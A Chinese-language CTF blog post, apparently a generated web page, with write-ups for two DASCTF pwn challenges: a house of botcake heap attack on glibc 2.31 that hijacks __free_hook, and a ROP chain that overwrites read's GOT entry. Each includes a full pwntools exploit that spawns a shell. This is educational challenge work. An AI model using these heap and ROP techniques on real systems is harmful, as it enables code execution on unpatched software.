@@ -1,0 +1,421 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="magic_book2.29版本以后增加了对tcache上key的检测，导致我们不能在tcache上直接double free了。这到底就是house of botcake标准模板题，唯一值得注意的点就是在我们构造堆重叠unsotrbin与tcache是，我们构造的重叠堆块的地址使用唯一的luck_free不把指针指令达到double free的效果，再切割unsortbin使得我们可以更改tca">
+<meta property="og:type" content="article">
+<meta property="og:title" content="dasctf10月pwn">
+<meta property="og:url" content="http://example.com/2022/11/11/dasctf10%E6%9C%88pwn/index.html">
+<meta property="og:site_name" content="Osaa&#39;s blog">
+<meta property="og:description" content="magic_book2.29版本以后增加了对tcache上key的检测，导致我们不能在tcache上直接double free了。这到底就是house of botcake标准模板题，唯一值得注意的点就是在我们构造堆重叠unsotrbin与tcache是，我们构造的重叠堆块的地址使用唯一的luck_free不把指针指令达到double free的效果，再切割unsortbin使得我们可以更改tca">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-11-11T07:36:04.000Z">
+<meta property="article:modified_time" content="2022-11-11T08:03:19.201Z">
+<meta property="article:author" content="Osaa">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/2022/11/11/dasctf10%E6%9C%88pwn/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>dasctf10月pwn | Osaa's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Osaa's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-friends">
+
+    <a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>Friends</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/11/dasctf10%E6%9C%88pwn/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/image/cat.png">
+      <meta itemprop="name" content="Osaa">
+      <meta itemprop="description" content="Try to do something interesting">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Osaa's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          dasctf10月pwn
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2022-11-11 15:36:04 / Modified: 16:03:19" itemprop="dateCreated datePublished" datetime="2022-11-11T15:36:04+08:00">2022-11-11</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="magic-book"><a href="#magic-book" class="headerlink" title="magic_book"></a>magic_book</h1><p>2.29版本以后增加了对tcache上key的检测，导致我们不能在tcache上直接double free了。这到底就是house of botcake标准模板题，唯一值得注意的点就是在我们构造堆重叠unsotrbin与tcache是，我们构造的重叠堆块的地址使用唯一的luck_free不把指针指令达到double free的效果，再切割unsortbin使得我们可以更改tcache指针指向残留的main+96地址，我们在进行爆破stdout就可以leak libc，之后我们再次利用house of botcake留下的重叠堆块（这一块想了好久一定要注意布置的堆块位置），就可以构造free_hook上写system，再free bin&#x2F;sh就可以getshell了</p>
+<span id="more"></span>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#r=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">context_log=<span class="string">&quot;Debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">	r.sendlineafter(<span class="string">&#x27;choice : &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	r.sendafter(<span class="string">&#x27;Size: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	r.sendafter(<span class="string">&#x27;Content: &#x27;</span>,content)</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">	r.sendlineafter(<span class="string">&#x27;choice : &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	r.sendlineafter(<span class="string">&#x27;dex: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">luck_free</span>(<span class="params">idx</span>):</span><br><span class="line">	r.sendlineafter(<span class="string">&#x27;choice : &#x27;</span>,<span class="string">&#x27;9&#x27;</span>)</span><br><span class="line">	r.sendlineafter(<span class="string">&#x27;dex: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line"> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">	add(<span class="number">0x80</span>,<span class="string">&quot;aaaaa&quot;</span>)</span><br><span class="line"> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">	free(<span class="number">6</span>-i)</span><br><span class="line"> luck_free(<span class="number">8</span>)</span><br><span class="line"> free(<span class="number">7</span>)</span><br><span class="line"> add(<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#10</span></span><br><span class="line"> free(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"> payload=p64(<span class="number">0</span>)*(<span class="number">2</span>*<span class="number">8</span>+<span class="number">1</span>)+p64(<span class="number">0x91</span>)+p16(<span class="number">0xb740</span>)</span><br><span class="line"> add(<span class="number">0xa0</span>,payload)<span class="comment">#11</span></span><br><span class="line"> payload1=p16(<span class="number">0x26a0</span>)</span><br><span class="line"> add(<span class="number">0x40</span>,payload1)<span class="comment">#12</span></span><br><span class="line"></span><br><span class="line"> add(<span class="number">0x80</span>,<span class="string">&#x27;osaa&#x27;</span>)<span class="comment">#13</span></span><br><span class="line"> add(<span class="number">0x80</span>,<span class="string">&#x27;osaa&#x27;</span>)<span class="comment">#14</span></span><br><span class="line"></span><br><span class="line"> payload2 =p64(<span class="number">0xfbad1800</span>) +p64(<span class="number">0</span>)*<span class="number">3</span> +<span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line"> add(<span class="number">0x80</span>,payload2)<span class="comment">#15</span></span><br><span class="line"></span><br><span class="line"> libc1=u64(r.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line"> <span class="built_in">print</span>(<span class="string">&quot;libc--&gt;&quot;</span>+<span class="built_in">hex</span>(libc1))</span><br><span class="line"> libc_base=libc1-<span class="number">0x1ec980</span></span><br><span class="line"> <span class="keyword">if</span> libc_base==<span class="number">0x1ec980</span>:</span><br><span class="line">	 exit(-<span class="number">1</span>)</span><br><span class="line"> <span class="built_in">print</span>(<span class="string">&quot;libc_base--&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"> free_hook = libc_base + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"> <span class="built_in">print</span>(<span class="string">&quot;free_hook--&gt;&quot;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line"> system=libc_base+libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"> <span class="built_in">print</span>(<span class="string">&quot;system--&gt;&quot;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line"> <span class="string">&quot;&quot;&quot;  stdout=libc_base+libc.symbols[&quot;_IO_2_1_stdout_&quot;]</span></span><br><span class="line"><span class="string"> stdout1=libc1+0xd20</span></span><br><span class="line"><span class="string"> print(&quot;===&quot;+hex(stdout1)+&quot;===&quot;+hex(stdout))</span></span><br><span class="line"><span class="string"> &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"> free(<span class="number">11</span>)</span><br><span class="line"> free(<span class="number">12</span>)</span><br><span class="line"> free(<span class="number">13</span>)</span><br><span class="line"> payload3=p64(<span class="number">0</span>)*(<span class="number">2</span>*<span class="number">8</span>+<span class="number">1</span>)+p64(<span class="number">0x91</span>)+p64(free_hook)</span><br><span class="line"> add(<span class="number">0xa0</span>,payload3)<span class="comment">#16</span></span><br><span class="line"> add(<span class="number">0x80</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)<span class="comment">#17</span></span><br><span class="line"> add(<span class="number">0x80</span>,p64(system))</span><br><span class="line"> free(<span class="number">17</span>)</span><br><span class="line"> r.interactive()</span><br><span class="line"> <span class="comment">#print(hex(libc_base+libc.symbols[&quot;_IO_2_1_stdout_&quot;]))</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot; r=remote(&quot;node4.buuoj.cn&quot;,29414)</span></span><br><span class="line"><span class="string">pwn()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">r.interactive()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot; if __name__==&#x27;__main__&#x27;:</span></span><br><span class="line"><span class="string">  while True:</span></span><br><span class="line"><span class="string">	r=process(&quot;./pwn&quot;)</span></span><br><span class="line"><span class="string">	#r=remote(&quot;node4.buuoj.cn&quot;,29414)</span></span><br><span class="line"><span class="string">  try:</span></span><br><span class="line"><span class="string"> 	pwn()</span></span><br><span class="line"><span class="string">    #gdb.attach(r)</span></span><br><span class="line"><span class="string">  except:</span></span><br><span class="line"><span class="string">	r.close()</span></span><br><span class="line"><span class="string"> &quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29414</span>)</span><br><span class="line">		</span><br><span class="line">        pwn()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        r.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="R-P"><a href="#R-P" class="headerlink" title="R()P"></a>R()P</h1><p>整个题目的构造相当巧妙，算是一种对gadget的利用的进阶吧。</p>
+<p>关键点在与利用和构造的思路吧，关键点在于发现rax的可以控制想到覆写read_got为system call这样来利用一次系统调用。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">-----leave_rsi--可以看到read的rsi由栈上控制-------------------</span><br><span class="line">      <span class="number">00000401126</span>                 sub     rsp, <span class="number">18</span>h</span><br><span class="line">.text:<span class="number">000000000040112</span>A                 mov     dword ptr [rsp+<span class="number">18</span>h+buf], <span class="number">100</span>h</span><br><span class="line">.text:<span class="number">0000000000401132</span>                 mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">0000000000401137</span>                 mov     edx, <span class="number">4</span>          ; nbytes</span><br><span class="line">.text:<span class="number">000000000040113</span>C                 mov     edi, <span class="number">0</span>          ; fd</span><br><span class="line">.text:<span class="number">0000000000401141</span>                 lea     rsi, [rsp+<span class="number">18</span>h+buf] ; buf</span><br><span class="line">.text:<span class="number">0000000000401146</span>                 call    _read</span><br><span class="line">--call_read--可以看到我们buf端就是利用rax值的内容再进行写入-------------------------</span><br><span class="line">.text:<span class="number">000000000040115</span>A                 mov     rsi, rax        ; buf</span><br><span class="line">.text:<span class="number">000000000040115</span>D                 mov     edx, dword ptr [rsp+<span class="number">18</span>h+buf] ; nbytes</span><br><span class="line">.text:<span class="number">0000000000401161</span>                 xor     edi, edi        ; fd</span><br><span class="line">.text:<span class="number">0000000000401163</span>                 mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">0000000000401168</span>                 call    _read</span><br><span class="line">--set_rax--可以看到这片代码我们可以利用在栈上的数据设置eax的值，但是使用的时候注意add <span class="number">0x18</span>补齐------</span><br><span class="line">.text:<span class="number">000000000040116</span>D                 mov     eax, dword ptr [rsp+<span class="number">18</span>h+buf]</span><br><span class="line">.text:<span class="number">0000000000401171</span>                 add     rsp, <span class="number">18</span>h</span><br><span class="line">.text:<span class="number">0000000000401175</span>                 retn</span><br><span class="line"> --mov_edi--可以看到是利用bss端上的内容填充edi后同样利用rax进行jmp-------------------------------</span><br><span class="line">.text:<span class="number">0000000000401099</span>                 mov     edi, offset __bss_start</span><br><span class="line">.text:<span class="number">000000000040109</span>E                 jmp     rax</span><br></pre></td></tr></table></figure>
+
+<p>分析以后思路就比较清楚了利用set_rax1次和call read设置在bss段首写入bin&#x2F;sh并且设置rax为read_got,read_got爆破一个字节找到system call，和利用mov_edi时候jmp rax设置为retn最后再进行一次call read和设置edi为0x3b为系统调用进行准备，再调用一次set_rax进行准备最后一次调用leave_rsi进行rsi归零来get shell。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29736</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line">call_read=<span class="number">0x00000000040115A</span></span><br><span class="line">set_rax=<span class="number">0x000000000040116D</span></span><br><span class="line">leave_rsi=<span class="number">0x000000000401141</span></span><br><span class="line">mov_edi=<span class="number">0x0000000004010DB</span></span><br><span class="line">bss=<span class="number">0x0000000000404018</span></span><br><span class="line"><span class="comment">#read_got=elf.got[&#x27;read&#x27;]</span></span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">retn=<span class="number">0x00000000040110E</span></span><br><span class="line"></span><br><span class="line">r.send(p32(<span class="number">0x100</span>))</span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">pay=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(set_rax)+p64(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(bss)+p64(<span class="number">0</span>)</span><br><span class="line">pay+=p64(call_read)+p64(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(read_got)+p64(<span class="number">0</span>)</span><br><span class="line">pay+=p64(call_read)+p64(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(bss+<span class="number">8</span>)+p64(<span class="number">0</span>)</span><br><span class="line">pay+=p64(set_rax)+p64(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(retn)+p64(<span class="number">0</span>)</span><br><span class="line">pay+=p64(mov_edi)</span><br><span class="line">pay+=p64(set_rax)+p64(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0x3b</span>)+p64(<span class="number">0</span>)</span><br><span class="line">pay+=p64(leave_rsi)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.send(pay)</span><br><span class="line">r.send(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">r.send(<span class="string">&quot;\x90&quot;</span>)</span><br><span class="line"><span class="comment">#print(hex(read_got))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/ctf/" rel="tag"># ctf</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/11/01/change-first-blog/" rel="prev" title="change-first-blog">
+      <i class="fa fa-chevron-left"></i> change-first-blog
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/11/20/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E6%A0%91%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" rel="next" title="数据结构-树学习记录">
+      数据结构-树学习记录 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#magic-book"><span class="nav-number">1.</span> <span class="nav-text">magic_book</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#R-P"><span class="nav-number">2.</span> <span class="nav-text">R()P</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Osaa"
+      src="/image/cat.png">
+  <p class="site-author-name" itemprop="name">Osaa</p>
+  <div class="site-description" itemprop="description">Try to do something interesting</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">13</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/sohaah" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;sohaah" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://qm.qq.com/q/rwESyZgdUI" title="QQ → https:&#x2F;&#x2F;qm.qq.com&#x2F;q&#x2F;rwESyZgdUI" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>QQ</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Osaa</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
